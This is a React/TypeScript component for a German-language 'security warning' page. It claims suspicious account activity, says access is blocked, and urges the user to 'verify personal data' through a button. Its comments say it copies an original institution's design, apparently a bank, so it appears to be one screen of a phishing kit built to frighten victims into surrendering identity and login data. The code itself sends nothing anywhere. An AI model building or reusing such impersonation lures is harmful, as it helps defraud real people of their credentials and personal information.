import React, { useState, useEffect } from 'react';

interface AccountCompromisedScreenProps {
  onStartVerification: () => void;
}

export const AccountCompromisedScreen: React.FC<AccountCompromisedScreenProps> = ({ onStartVerification }) => {
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  return (
    <div style={{
      backgroundColor: '#f5f5f5',
      minHeight: '60vh',
      padding: '0',
      fontFamily: 'Source Sans Pro, Arial, sans-serif',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center'
    }}>
      <div style={{
        maxWidth: '1400px',
        width: '100%',
        margin: '0 auto',
        padding: isMobile ? '40px 20px' : '60px 8px',
        textAlign: 'center'
      }}>
        {/* Blue Illustration/Graphic */}
        <div style={{
          marginBottom: isMobile ? '40px' : '60px',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center'
        }}>
          <svg 
            width={isMobile ? "300" : "400"} 
            height={isMobile ? "150" : "200"} 
            viewBox="0 0 400 200" 
            fill="none" 
            xmlns="http://www.w3.org/2000/svg"
            style={{
              maxWidth: '100%',
              height: 'auto',
              display: 'block'
            }}
          >
            {/* Blue illustration elements similar to the original */}
            <rect x="50" y="120" width="80" height="40" rx="8" fill="#5a9bd3" opacity="0.8"/>
            <rect x="140" y="100" width="60" height="60" rx="30" fill="#3a8bc8"/>
            <rect x="210" y="110" width="70" height="50" rx="10" fill="#2a7bb8" opacity="0.9"/>
            <rect x="290" y="90" width="60" height="70" rx="15" fill="#012169"/>
            
            {/* Gear/cog elements */}
            <circle cx="120" cy="80" r="25" fill="#5a9bd3" opacity="0.7"/>
            <circle cx="120" cy="80" r="15" fill="none" stroke="#ffffff" strokeWidth="3"/>
            <circle cx="120" cy="80" r="6" fill="#ffffff"/>
            
            <circle cx="280" cy="60" r="20" fill="#3a8bc8" opacity="0.8"/>
            <circle cx="280" cy="60" r="12" fill="none" stroke="#ffffff" strokeWidth="2"/>
            <circle cx="280" cy="60" r="4" fill="#ffffff"/>
            
            {/* Steam/cloud elements */}
            <path d="M160 40 Q180 20 200 40 Q220 20 240 40 Q260 25 280 45" 
                  stroke="#7ab8e8" strokeWidth="4" fill="none" opacity="0.6"/>
            <path d="M180 25 Q200 10 220 25 Q240 10 260 25" 
                  stroke="#5ba3d3" strokeWidth="3" fill="none" opacity="0.5"/>
            
            {/* Person figure */}
            <circle cx="320" cy="130" r="12" fill="#012169"/>
            <rect x="315" y="142" width="10" height="25" rx="5" fill="#012169"/>
            <rect x="310" y="155" width="8" height="15" rx="4" fill="#012169"/>
            <rect x="322" y="155" width="8" height="15" rx="4" fill="#012169"/>
            <rect x="305" y="147" width="12" height="3" rx="1.5" fill="#012169"/>
            <rect x="323" y="147" width="12" height="3" rx="1.5" fill="#012169"/>
          </svg>
        </div>

        {/* Main Heading */}
        <h1 style={{
          color: '#012169',
          fontSize: isMobile ? '1.75rem' : '2.5rem',
          fontWeight: '600',
          marginBottom: isMobile ? '20px' : '30px',
          fontFamily: 'Source Sans Pro, Arial, sans-serif',
          lineHeight: '1.2',
          maxWidth: '800px',
          margin: `0 auto ${isMobile ? '20px' : '30px'} auto`
        }}>
          Sicherheitswarnung
        </h1>

        {/* Error Banner like login error */}
        <div style={{
          maxWidth: isMobile ? '90%' : '600px',
          margin: `0 auto ${isMobile ? '30px' : '40px'} auto`,
          backgroundColor: '#ffebee',
          border: '1px solid #ffcdd2',
          borderRadius: '8px',
          padding: '16px',
          display: 'flex',
          alignItems: 'flex-start',
          gap: '12px'
        }}>
          <svg 
            width="20" 
            height="20" 
            viewBox="0 0 24 24" 
            fill="none" 
            style={{ 
              marginTop: '2px',
              flexShrink: 0
            }}
          >
            <path 
              d="M12 2L1 21h22L12 2zm0 3.99L19.53 19H4.47L12 5.99zM11 16h2v2h-2v-2zm0-6h2v4h-2v-4z" 
              fill="#d32f2f"
            />
          </svg>
          <div style={{ 
            flex: 1,
            textAlign: 'left'
          }}>
            <div style={{
              color: '#d32f2f',
              fontSize: '14px',
              fontWeight: '600',
              fontFamily: 'Source Sans Pro, Arial, sans-serif'
            }}>
              Verdächtige Aktivitäten erkannt
            </div>
          </div>
        </div>

        {/* Description Text */}
        <div style={{
          marginBottom: isMobile ? '30px' : '40px',
          maxWidth: '600px',
          margin: `0 auto ${isMobile ? '30px' : '40px'} auto`,
          textAlign: 'center'
        }}>
          <p style={{
            color: '#000',
            fontSize: isMobile ? '16px' : '18px',
            fontWeight: '600',
            lineHeight: '1.6',
            marginBottom: '16px',
            fontFamily: 'Source Sans Pro, Arial, sans-serif'
          }}>
            Aus Sicherheitsgründen wurde Ihr Zugang vorübergehend gesperrt.
          </p>
          <p style={{
            color: '#666',
            fontSize: isMobile ? '15px' : '17px',
            fontWeight: 'normal',
            lineHeight: '1.6',
            marginBottom: '16px',
            fontFamily: 'Source Sans Pro, Arial, sans-serif'
          }}>
            Wir haben ungewöhnliche Aktivitäten in Ihrem Konto festgestellt. Um Ihre Sicherheit zu gewährleisten, müssen Sie Ihre Identität bestätigen.
          </p>
          <p style={{
            color: '#666',
            fontSize: isMobile ? '15px' : '17px',
            fontWeight: 'normal',
            lineHeight: '1.6',
            marginBottom: '0',
            fontFamily: 'Source Sans Pro, Arial, sans-serif'
          }}>
            Bitte verifizieren Sie Ihre persönlichen Daten, um den Zugang wiederherzustellen.
          </p>
        </div>

        {/* Button */}
        <div style={{
          display: 'flex',
          justifyContent: 'center'
        }}>
          <button
            onClick={onStartVerification}
            style={{
              width: isMobile ? '100%' : 'auto',
              padding: isMobile ? '16px 24px' : '16px 40px',
              backgroundColor: '#012169',
              color: 'white',
              border: 'none',
              borderRadius: '4px',
              fontSize: isMobile ? '1rem' : '1.125rem',
              fontWeight: '600',
              cursor: 'pointer',
              transition: 'background-color 0.2s ease',
              fontFamily: 'Source Sans Pro, Arial, sans-serif',
              minHeight: isMobile ? '48px' : 'auto',
              minWidth: isMobile ? 'auto' : '250px'
            }}
            onMouseOver={(e) => {
              e.currentTarget.style.backgroundColor = '#0056b3';
            }}
            onMouseOut={(e) => {
              e.currentTarget.style.backgroundColor = '#012169';
            }}
          >
            Identität verifizieren
          </button>
        </div>
      </div>
    </div>
  );
}; 